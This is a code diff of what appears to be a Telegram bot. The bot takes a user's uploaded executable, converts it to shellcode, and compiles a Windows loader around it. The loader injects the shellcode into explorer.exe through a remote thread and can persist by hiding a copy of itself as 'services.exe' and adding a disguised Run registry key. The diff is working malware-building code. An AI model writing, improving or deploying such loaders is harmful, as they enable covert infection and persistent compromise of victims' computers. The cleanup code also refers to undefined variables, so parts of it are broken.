@@ -341,8 +341,6 @@ async def file_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
 
     return GET_FILENAME
 
-import base64
-
 async def get_filename(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Stores the desired filename and asks about startup persistence."""
     filename = update.message.text
@@ -367,7 +365,7 @@ async def get_filename(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     return GET_STARTUP_CHOICE
 
 async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Stores startup choice, compiles with corrected persistence logic, and sends."""
+    """Stores startup choice, compiles with the new stub, sends, and cleans."""
     query = update.callback_query
     await query.answer()
 
@@ -390,68 +388,80 @@ async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE)
         await edit_message(query, "Processing your file... This may take a moment.", None)
 
         shellcode_bytes = donut.create(file=input_path)
-        encoded_shellcode = base64.b85encode(shellcode_bytes).decode('ascii')
+        # Format shellcode as a C-style hex string
+        shellcode_hex = "".join([f"\\x{b:02x}" for b in shellcode_bytes])
 
         startup_macro = "#define StartUP true" if startup else "#define StartUP false"
 
-        # NOTE: The C++ stub is now logically corrected for persistence.
         cpp_template = f'''
 #include <windows.h>
-#include <string>
+#include <iostream>
 #include <vector>
+#include <string>
 #include <tlhelp32.h>
 #include <stdlib.h>
-#include <shlobj.h>
-#include <shlwapi.h>
-
-#pragma comment(lib, "shlwapi.lib")
 
 {startup_macro}
 
-// Base85 decoding function
-std::vector<unsigned char> b85_decode(const std::string& b85_string) {{
-    std::vector<unsigned char> decoded_data;
-    unsigned int buffer = 0;
-    int count = 0;
-    for (char c : b85_string) {{
-        if (c < '!' || c > 'u') continue;
-        buffer = buffer * 85 + (c - 33);
-        count++;
-        if (count == 5) {{
-            decoded_data.push_back(buffer >> 24);
-            decoded_data.push_back(buffer >> 16);
-            decoded_data.push_back(buffer >> 8);
-            decoded_data.push_back(buffer);
-            buffer = 0;
-            count = 0;
-        }}
-    }}
-    if (count > 0) {{
-        for (int i = count; i < 5; i++) buffer = buffer * 85 + 84;
-        for (int i = 0; i < count - 1; i++) {{
-            decoded_data.push_back((buffer >> (24 - i * 8)) & 0xFF);
-        }}
-    }}
-    return decoded_data;
-}}
-
-// Persistence function
-void RegisterSystemTask(const std::string& executablePath) {{
+bool RegisterSystemTask(const std::string& executablePath) {{
     HKEY hKey;
     const char* runKey = "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run";
     const char* valueName = "SystemCoreService";
-    if (RegOpenKeyExA(HKEY_CURRENT_USER, runKey, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {{
-        RegSetValueExA(hKey, valueName, 0, REG_SZ, (const BYTE*)executablePath.c_str(), executablePath.length() + 1);
-        RegCloseKey(hKey);
+
+    LONG openRes = RegOpenKeyExA(HKEY_CURRENT_USER, runKey, 0, KEY_WRITE, &hKey);
+    if (openRes != ERROR_SUCCESS) {{
+        return false;
     }}
+
+    LONG setRes = RegSetValueExA(hKey, valueName, 0, REG_SZ, (const BYTE*)executablePath.c_str(), executablePath.length() + 1);
+    if (setRes != ERROR_SUCCESS) {{
+        RegCloseKey(hKey);
+        return false;
+    }}
+
+    RegCloseKey(hKey);
+    return true;
 }}
 
-// Process search function
+enum RelocateResult {{
+    RELOCATE_SUCCESS,
+    RELOCATE_ALREADY_EXISTS,
+    RELOCATE_FAILED
+}};
+
+RelocateResult RelocateModule(std::string& newPath) {{
+    char currentPath[MAX_PATH];
+    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
+
+    const char* appDataPath = getenv("APPDATA");
+    if (appDataPath == NULL) {{
+        return RELOCATE_FAILED;
+    }}
+
+    newPath = std::string(appDataPath) + "\\\\services.exe";
+
+    if (!CopyFileA(currentPath, newPath.c_str(), TRUE)) {{ // TRUE = bFailIfExists
+        DWORD error = GetLastError();
+        if (error == ERROR_FILE_EXISTS) {{
+            return RELOCATE_ALREADY_EXISTS;
+        }} else {{
+            return RELOCATE_FAILED;
+        }}
+    }}
+
+    SetFileAttributesA(newPath.c_str(), FILE_ATTRIBUTE_HIDDEN);
+    return RELOCATE_SUCCESS;
+}}
+
 DWORD FindTargetProcess(const std::string& processName) {{
     PROCESSENTRY32 entry;
     entry.dwSize = sizeof(PROCESSENTRY32);
+
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (snapshot == INVALID_HANDLE_VALUE) return 0;
+    if (snapshot == INVALID_HANDLE_VALUE) {{
+        return 0;
+    }}
+
     if (Process32First(snapshot, &entry) == TRUE) {{
         while (Process32Next(snapshot, &entry) == TRUE) {{
             if (_stricmp(entry.szExeFile, processName.c_str()) == 0) {{
@@ -460,66 +470,58 @@ DWORD FindTargetProcess(const std::string& processName) {{
             }}
         }}
     }}
+
     CloseHandle(snapshot);
     return 0;
 }}
 
-// The shellcode payload
-const std::string b85_shellcode = "{encoded_shellcode}";
-
-// The main payload injection logic
-void InjectPayload() {{
-    std::vector<unsigned char> shellcode = b85_decode(b85_shellcode);
-    if (shellcode.empty()) return;
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
+    char shellcode[] = "{shellcode_hex}";
 
     DWORD pid = FindTargetProcess("explorer.exe");
-    if (pid == 0) return;
-
-    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
-    if (hProcess == NULL) return;
-
-    PVOID pRemoteAddress = VirtualAllocEx(hProcess, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (pRemoteAddress == NULL) {{
-        CloseHandle(hProcess);
-        return;
+    if (pid == 0) {{
+        return 1;
     }}
 
-    if (!WriteProcessMemory(hProcess, pRemoteAddress, shellcode.data(), shellcode.size(), NULL)) {{
+    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
+    if (hProcess == NULL) {{
+        return 1;
+    }}
+
+    PVOID pRemoteAddress = VirtualAllocEx(hProcess, NULL, sizeof(shellcode) - 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (pRemoteAddress == NULL) {{
+        CloseHandle(hProcess);
+        return 1;
+    }}
+
+    if (!WriteProcessMemory(hProcess, pRemoteAddress, shellcode, sizeof(shellcode) - 1, NULL)) {{
         VirtualFreeEx(hProcess, pRemoteAddress, 0, MEM_RELEASE);
         CloseHandle(hProcess);
-        return;
+        return 1;
     }}
 
     HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteAddress, NULL, 0, NULL);
-    if (hThread != NULL) {{
-        CloseHandle(hThread);
+    if (hThread == NULL) {{
+        VirtualFreeEx(hProcess, pRemoteAddress, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return 1;
     }}
+
+    CloseHandle(hThread);
     CloseHandle(hProcess);
-}}
 
-// Main entry point with corrected persistence logic
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
 #if StartUP
-    char currentPath[MAX_PATH];
-    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
+    // --- Persistence Logic ---
+    std::string newPath;
+    RelocateResult relocateResult = RelocateModule(newPath);
 
-    char appDataPath[MAX_PATH];
-    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {{
-        PathAppendA(appDataPath, "services.exe");
-
-        // If we are not already running from the target path...
-        if (_stricmp(currentPath, appDataPath) != 0) {{
-            // ...copy self to target path, register for startup, and exit.
-            if (CopyFileA(currentPath, appDataPath, FALSE)) {{ // FALSE to overwrite
-                SetFileAttributesA(appDataPath, FILE_ATTRIBUTE_HIDDEN);
-                RegisterSystemTask(appDataPath); // Register the NEW path
-            }}
-            return 0; // Exit. The payload runs from the new location on next startup.
+    if (relocateResult == RELOCATE_SUCCESS) {{
+        if (!RegisterSystemTask(newPath)) {{
+            // Persistence failed, but payload delivered.
         }}
     }}
 #endif
 
-    InjectPayload();
     return 0;
 }}
 '''
@@ -527,7 +529,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             f.write(cpp_template)
 
         compile_result = subprocess.run(
-            ["g++", cpp_file_path, "-o", compiled_exe_path, "-mwindows", "-s", "-w", "-lshlwapi"],
+            ["g++", cpp_file_path, "-o", compiled_exe_path, "-mwindows", "-s", "-w"],
             capture_output=True, text=True,
         )
 
@@ -535,6 +537,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             error_msg = f"Compilation Error:\\n{compile_result.stderr}"
             print(f"Compilation failed for user {uid}:\\n{error_msg}")
 
+            # Truncate for Telegram
             if len(error_msg) > 4000:
                 error_msg = error_msg[:4000] + "\\n...(truncated)"
 
@@ -556,7 +559,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     finally:
         for path in [input_path, cpp_file_path, compiled_exe_path]:
             if path and os.path.exists(path):
-                os.remove(asd)
+                os.remove(aa) #path
         context.user_data.clear()
 
     return ConversationHandler.END
